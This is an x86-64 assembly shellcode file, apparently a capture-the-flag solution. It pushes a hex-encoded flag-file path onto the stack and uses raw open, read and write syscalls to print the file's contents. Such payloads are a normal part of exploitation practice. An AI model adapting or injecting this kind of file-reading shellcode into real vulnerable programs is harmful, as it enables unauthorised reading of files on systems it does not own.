section .text
global start
start:
    xor rax, rax
    push rax
    mov rax, 0x676e6f6f6f6f6f6f
    push rax
    mov rax, 0x6c5f73695f656d61
    push rax
    mov rax, 0x6e5f67616c662f63
    push rax
    mov rax, 0x697361625f6c6c65
    push rax
    mov rax, 0x68732f656d6f682f
    push rax
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x02
    syscall ; open call

    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30
    mov rdx, 0x30
    xor rax, rax
    syscall
    
    mov rdi, 0x1
    mov rax, 0x1
    syscall

    xor rdi, rdi   
    mov rax, 0x3c	
    syscall 
